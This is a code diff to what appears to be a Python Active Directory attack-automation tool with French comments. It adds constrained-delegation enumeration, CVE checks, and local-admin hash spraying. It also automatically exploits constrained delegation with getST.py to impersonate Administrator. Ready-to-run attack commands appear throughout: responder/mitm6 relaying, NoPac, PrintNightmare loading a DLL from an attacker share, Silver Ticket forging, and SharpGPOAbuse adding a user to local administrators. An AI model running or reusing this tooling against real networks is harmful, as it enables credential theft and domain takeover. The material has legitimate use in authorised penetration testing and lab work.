@@ -703,6 +703,9 @@ def phase1_unauth(hosts, args, state):
     if not dc:
         log(f"{C.R}[!] Pas de DC identifie -> phase 1 limitee.{C.X}")
         return
+    # les 2 vecteurs SANS cred (proposes tot, jamais executes) + check ZeroLogon
+    mitm6_responder_hint(state)
+    cve_checks(args, state, dc, authed=False)
     nxc = nxc_bin()
     confirmed = set()   # vrais comptes enumeres (LDAP/RID/nxc/kerbrute-valide)
     seed = set()        # userlist fournie (validation kerbrute / roast en aveugle)
@@ -1228,10 +1231,10 @@ def ldap_dump(conn, base, state, args):
     """Dump LDAP pur-python : users/computers/groups + classification."""
     interesting = {"kerberoastable": [], "asreproastable": [], "admincount": [],
                    "pwd_notreqd": [], "unconstrained": [], "desc_secrets": [],
-                   "disabled": 0, "users": 0, "computers": []}
+                   "constrained": [], "disabled": 0, "users": 0, "computers": []}
     # USERS (pagination complete)
     attrs = ["sAMAccountName", "userAccountControl", "servicePrincipalName",
-             "adminCount", "description", "memberOf"]
+             "adminCount", "description", "memberOf", "msDS-AllowedToDelegateTo"]
     for e in ldap_search_all(conn, base, "(&(objectClass=user)(objectCategory=person))", attrs):
         interesting["users"] += 1
         sam = str(getattr(e, "sAMAccountName", "") or "")
@@ -1252,6 +1255,12 @@ def ldap_dump(conn, base, state, args):
             interesting["admincount"].append(sam)
         if desc and re.search(r"pass|pwd|mot de passe|cred|secret", desc, re.I):
             interesting["desc_secrets"].append(f"{sam}: {desc[:80]}")
+        # delegation CONTRAINTE (msDS-AllowedToDelegateTo) -> S4U possible
+        a2d = getattr(e, "msDS-AllowedToDelegateTo", None)
+        if a2d and str(a2d):
+            spns = a2d if isinstance(a2d, (list, tuple)) else [a2d]
+            for spn in spns:
+                interesting["constrained"].append({"account": sam, "spn": str(spn)})
         # tableau de bord : ligne user (flags courts + description)
         short = []
         if spn and str(spn): short.append("SPN")
@@ -1264,7 +1273,8 @@ def ldap_dump(conn, base, state, args):
     # COMPUTERS (pagination complete)
     for e in ldap_search_all(conn, base, "(objectClass=computer)",
                              ["sAMAccountName", "operatingSystem", "userAccountControl",
-                              "msDS-AllowedToActOnBehalfOfOtherIdentity"]):
+                              "msDS-AllowedToActOnBehalfOfOtherIdentity",
+                              "msDS-AllowedToDelegateTo"]):
         name = str(getattr(e, "sAMAccountName", "") or "")
         os_ = str(getattr(e, "operatingSystem", "") or "")
         flags = uac_flags(getattr(e, "userAccountControl", 0))
@@ -1274,6 +1284,11 @@ def ldap_dump(conn, base, state, args):
             tag.append("UNCONSTRAINED")
         if rbcd and str(rbcd):
             tag.append("RBCD")
+        a2d = getattr(e, "msDS-AllowedToDelegateTo", None)
+        if a2d and str(a2d):
+            tag.append("CONSTRAINED")
+            for spn in (a2d if isinstance(a2d, (list, tuple)) else [a2d]):
+                interesting["constrained"].append({"account": name, "spn": str(spn)})
         interesting["computers"].append({"name": name, "os": os_, "deleg": tag})
     return interesting
 
@@ -1517,9 +1532,15 @@ def phase3_authenum(hosts, args, state):
                         if c["deleg"]:
                             add_finding(state, "HIGH", f"Delegation sur {c['name']} : {'+'.join(c['deleg'])}",
                                         "abus RBCD/unconstrained", dc)
-                    # mini-BloodHound : ACL/DACL + LAPS + trusts (une seule fois par domaine)
+                    # delegation CONTRAINTE (detection + commande S4U ; exploit = phase4)
+                    for t in intel.get("constrained", []):
+                        add_finding(state, "HIGH", f"Delegation CONTRAINTE : {t['account']} -> {t['spn']}",
+                                    f"getST.py -spn {t['spn']} -impersonate Administrator "
+                                    f"{args.domain}/{t['account']}:<pass> -dc-ip {dc}", dc)
+                    # mini-BloodHound : ACL/DACL + LAPS + trusts + GPO (une seule fois)
                     if _once(state, f"acl:{base}"):
                         ldap_acl_scan(conn, base, state)
+                        enum_gpo_abuse(conn, base, state)
                         read_laps(conn, base, state)
                         enum_trusts(conn, base, state)
                         enum_dmsa_badsuccessor(conn, base, state, args, dc)
@@ -1624,6 +1645,207 @@ def phase3_authenum(hosts, args, state):
     crack_hashes(args, state)
     # reutilisation de mot de passe : spray les mdp craques sur tous les users
     spray_reuse(args, state, dc)
+    # CVE checks auth (NoPac/PrintNightmare/PetitPotam) - detection seule
+    cve_checks(args, state, dc, authed=True)
+    # Silver Ticket (si hash NT de service + SID) + reutilisation hash admin LOCAL
+    silver_ticket_hint(args, state, dc)
+    local_admin_spray(args, state, hosts)
+
+# ======================================================================
+# MODULES SUPPLEMENTAIRES (cheat sheet hard-box) : detection + commandes
+# ======================================================================
+def mitm6_responder_hint(state):
+    """Les 2 vecteurs SANS credential : jamais executes, juste proposes tot."""
+    if not _once(state, "poison_hint"):
+        return
+    add_finding(state, "INFO", "LLMNR/NBT-NS/mDNS poisoning (sans cred, position reseau)",
+                "sudo responder -I eth0 -dwv   puis: hashcat -m 5600 ntlmv2.txt rockyou.txt")
+    add_finding(state, "INFO", "IPv6 mitm6 -> relais LDAPS (sans cred, tres fiable en lab)",
+                "sudo mitm6 -d <domaine>  +  ntlmrelayx.py -6 -t ldaps://<DC> "
+                "-wh fakewpad.<domaine> --delegate-access")
+
+def cve_checks(args, state, dc, authed=False):
+    """DETECTION SEULE (jamais d'auto-exploit, meme sous --exploit) via modules nxc :
+    ZeroLogon (non-auth), NoPac / PrintNightmare / PetitPotam (auth)."""
+    nxc = nxc_bin()
+    if not (nxc and dc):
+        return
+    checks = [("zerologon", "CRIT", False,
+               "JAMAIS d'auto-exploit (casse la replication du DC) - check only")]
+    if authed:
+        checks += [
+            ("nopac", "CRIT", True, "CVE-2021-42278/42287 -> DA quasi direct"),
+            ("printnightmare", "HIGH", True, "CVE-2021-34527 RCE spooler"),
+            ("petitpotam", "HIGH", True, "coercion MS-EFSRPC -> relais ntlmrelayx / ADCS ESC8"),
+        ]
+    cmds = {
+        "zerologon": f"python3 zerologon_tester.py <DC_HOST> {dc}   # check (exploit = cve-2020-1472, JAMAIS en prod)",
+        "nopac": f"python3 noPac.py {args.domain}/{args.user}:<pass> -dc-ip {dc} -dc-host <DC_HOST> --impersonate administrator -use-ldap -shell",
+        "printnightmare": f"python3 CVE-2021-1675.py {args.domain}/{args.user}:<pass>@{dc} '\\\\<ATTACKER>\\share\\payload.dll'",
+        "petitpotam": f"python3 PetitPotam.py -u {args.user} -p <pass> <ATTACKER> {dc}   (+ ntlmrelayx en ecoute)",
+    }
+    for mod, sev, need_auth, note in checks:
+        auth = nxc_auth(args) if need_auth else nxc_auth(args, null=True)
+        rc, out, _ = run_cmd([nxc, "smb", dc] + auth +
+                             (["-d", args.domain] if (need_auth and args.domain) else []) +
+                             ["-M", mod], 90)
+        if re.search(r"VULNERABLE|is vulnerable|may be vulnerable", out, re.I):
+            add_finding(state, sev, f"{mod.upper()} : cible potentiellement VULNERABLE",
+                        f"{note} | {cmds.get(mod, mod)}", dc)
+
+def _md4_py(data):
+    """MD4 pur-python (OpenSSL retire md4 sur les Python recents)."""
+    import struct as _s
+    h = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
+    msg = bytearray(data)
+    ln = (8 * len(data)) & 0xffffffffffffffff
+    msg.append(0x80)
+    while len(msg) % 64 != 56:
+        msg.append(0)
+    msg += _s.pack("<Q", ln)
+    def lr(x, n): return ((x << n) | (x >> (32 - n))) & 0xffffffff
+    for off in range(0, len(msg), 64):
+        X = list(_s.unpack("<16I", msg[off:off + 64]))
+        A, B, Cc, D = h
+        for i in [0, 4, 8, 12]:
+            A = lr((A + (B & Cc | ~B & D) + X[i]) & 0xffffffff, 3)
+            D = lr((D + (A & B | ~A & Cc) + X[i + 1]) & 0xffffffff, 7)
+            Cc = lr((Cc + (D & A | ~D & B) + X[i + 2]) & 0xffffffff, 11)
+            B = lr((B + (Cc & D | ~Cc & A) + X[i + 3]) & 0xffffffff, 19)
+        for i in [0, 1, 2, 3]:
+            A = lr((A + (B & Cc | B & D | Cc & D) + X[i] + 0x5a827999) & 0xffffffff, 3)
+            D = lr((D + (A & B | A & Cc | B & Cc) + X[i + 4] + 0x5a827999) & 0xffffffff, 5)
+            Cc = lr((Cc + (D & A | D & B | A & B) + X[i + 8] + 0x5a827999) & 0xffffffff, 9)
+            B = lr((B + (Cc & D | Cc & A | D & A) + X[i + 12] + 0x5a827999) & 0xffffffff, 13)
+        for i in [0, 2, 1, 3]:
+            A = lr((A + (B ^ Cc ^ D) + X[i] + 0x6ed9eba1) & 0xffffffff, 3)
+            D = lr((D + (A ^ B ^ Cc) + X[i + 8] + 0x6ed9eba1) & 0xffffffff, 9)
+            Cc = lr((Cc + (D ^ A ^ B) + X[i + 4] + 0x6ed9eba1) & 0xffffffff, 11)
+            B = lr((B + (Cc ^ D ^ A) + X[i + 12] + 0x6ed9eba1) & 0xffffffff, 15)
+        h = [(h[0] + A) & 0xffffffff, (h[1] + B) & 0xffffffff,
+             (h[2] + Cc) & 0xffffffff, (h[3] + D) & 0xffffffff]
+    return _s.pack("<4I", *h).hex()
+
+def _nt_hash(pw):
+    """NT hash (MD4 UTF-16LE) d'un mot de passe en clair -> pour Silver Ticket."""
+    import hashlib
+    try:
+        return hashlib.new("md4", pw.encode("utf-16-le")).hexdigest()
+    except Exception:
+        return _md4_py(pw.encode("utf-16-le"))
+
+def silver_ticket_hint(args, state, dc):
+    """Hash NT (ou mdp->NT) d'un compte de SERVICE + SID du domaine -> propose la
+    forge d'un Silver Ticket (commande prete). Ne forge PAS automatiquement."""
+    sid = state.get("domain_sid")
+    if not (sid and args.domain and _gate(args)):
+        return
+    svc_low = {s.lower() for s in state.get("ldap_intel", {}).get("kerberoastable", [])}
+    for c in list(state.get("creds", [])):
+        u = (c.get("user") or "")
+        if u.lower() not in svc_low:            # seulement les comptes de service (SPN)
+            continue
+        nt = c.get("hash") or (_nt_hash(c["password"]) if c.get("password") else None)
+        if nt and _once(state, f"silver:{u.lower()}"):
+            add_finding(state, "HIGH", f"Silver Ticket possible via le service {u}",
+                        f"ticketer.py -nthash {nt} -domain-sid {sid} -domain {args.domain} "
+                        f"-spn <service>/<host>.{args.domain} Administrator", dc)
+
+def local_admin_spray(args, state, hosts):
+    """Reutilisation d'un hash admin LOCAL (LAPS/SAM) sur les hotes (--local-auth).
+    Lecture seule (comme le spray), pas de gate specifique."""
+    nxc = nxc_bin()
+    if not nxc:
+        return
+    localish = []
+    for c in state.get("creds", []):
+        if not c.get("hash"):
+            continue
+        user_l = (c.get("user") or "").lower()
+        src_l = (c.get("src") or "").lower()
+        if user_l in ("administrator", "admin") or src_l in ("laps", "sam", "local", "secretsdump"):
+            localish.append(c)
+    ips = list(hosts.keys())
+    tried = state.setdefault("_localspray", set())
+    for c in localish:
+        nt = c.get("hash")
+        if not nt or nt in tried:
+            continue
+        tried.add(nt)
+        for ip in ips:
+            rc, out, _ = run_cmd([nxc, "smb", ip, "-u", c.get("user") or "administrator",
+                                  "-H", nt_full(nt), "--local-auth"], 60)
+            if "Pwn3d" in out:
+                add_finding(state, "CRIT", f"Admin LOCAL reutilise sur {ip} (compte {c.get('user')})",
+                            f"nxc smb {ip} -u {c.get('user')} -H <hash> --local-auth -x whoami", ip)
+
+def abuse_constrained_delegation(args, state, dc):
+    """Delegation CONTRAINTE (msDS-AllowedToDelegateTo) -> S4U2Self+S4U2Proxy (getST)
+    -impersonate Administrator, SANS passer par RBCD. Exploite si on possede le
+    compte delegant, sinon propose la commande."""
+    targets = state.get("ldap_intel", {}).get("constrained") or []
+    if not targets:
+        return
+    owned = {(c.get("user") or "").lower(): c for c in state.get("creds", [])}
+    for t in targets:
+        acct, spn = t["account"], t["spn"]
+        cred = owned.get(acct.lower()) or owned.get(acct.rstrip("$").lower())
+        can_exec = cred and have("getST.py") and args.domain and _gate(args)
+        if not can_exec:
+            add_finding(state, "HIGH", f"Delegation CONTRAINTE : {acct} -> {spn}",
+                        f"getST.py -spn {spn} -impersonate Administrator "
+                        f"{args.domain}/{acct}:<pass> -dc-ip {dc}", dc)
+            continue
+        if cred.get("hash"):
+            tgt, extra = f"{args.domain}/{acct}", ["-hashes", nt_full(cred["hash"])]
+        else:
+            tgt, extra = f"{args.domain}/{acct}:{cred.get('password') or ''}", []
+        log(f"{C.R}{C.BD}[i] Constrained deleg S4U : {acct} -> {spn} (impersonate Administrator)...{C.X}")
+        rc, out, _ = run_cmd(["getST.py", "-spn", spn, "-impersonate", "Administrator",
+                              tgt, "-dc-ip", dc] + extra, 180)
+        if re.search(r"Saving ticket|\.ccache", out):
+            state.setdefault("tickets", []).append(spn)
+            add_finding(state, "CRIT", f"Delegation contrainte EXPLOITEE : {acct} -> Administrator via {spn}",
+                        f"export KRB5CCNAME=Administrator@{spn.replace('/', '_')}.ccache ; "
+                        f"psexec.py -k -no-pass {args.domain}/administrator@<host> -dc-ip {dc}", dc)
+
+def enum_gpo_abuse(conn, base, state):
+    """GPO modifiable : ACE dangereuse d'un principal non-privilegie sur un
+    groupPolicyContainer -> SharpGPOAbuse (commande, pas d'exec cote Linux)."""
+    if not have_lib("ldap3") or not have_lib("impacket"):
+        return
+    try:
+        from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
+        from ldap3.protocol.microsoft import security_descriptor_control
+    except Exception:
+        return
+    ctrl = security_descriptor_control(sdflags=0x04)
+    try:
+        for e in ldap_search_all(conn, base, "(objectClass=groupPolicyContainer)",
+                                 ["displayName", "cn", "nTSecurityDescriptor"], controls=ctrl):
+            raw = getattr(e, "nTSecurityDescriptor", None)
+            if not raw or not raw.raw_values:
+                continue
+            gname = str(getattr(e, "displayName", "") or getattr(e, "cn", "") or "?")
+            try:
+                sd = SR_SECURITY_DESCRIPTOR(); sd.fromString(raw.raw_values[0])
+            except Exception:
+                continue
+            for ace in sd["Dacl"].aces:
+                info = _dangerous_ace(ace)
+                if not info:
+                    continue
+                psid, rights = info
+                if _is_priv_sid(psid):
+                    continue
+                if _once(state, f"gpo:{gname}:{psid}"):
+                    add_finding(state, "HIGH", f"GPO modifiable : '{gname}' ({'+'.join(rights)})",
+                                "SharpGPOAbuse.exe --AddComputerTask --TaskName Update "
+                                "--Command cmd.exe --Arguments \"/c net localgroup administrators <user> /add\" "
+                                f"--GPOName \"{gname}\"  ; gpupdate /force", "")
+                    break
+    except Exception as e:
+        dbg(f"[i] enum_gpo_abuse: {e}")
 
 # ======================================================================
 # PHASE 4 : ESCALADE & LATERAL
@@ -1634,6 +1856,8 @@ def phase4_escalation(hosts, args, state):
 
     # 1) exploitation active des ACL abusables (shadow creds / RBCD / targeted roast)
     abuse_acl_paths(args, state, dc)
+    # delegation CONTRAINTE : S4U2Self+S4U2Proxy -> ticket Administrator (si compte possede)
+    abuse_constrained_delegation(args, state, dc)
     # crack immediat des hashes obtenus (ex: targeted kerberoast) -> nouveau cred
     crack_hashes(args, state)
     # chasse de creds planquees SUR LE DISQUE via WinRM (scripts/configs) -> nouvel acces
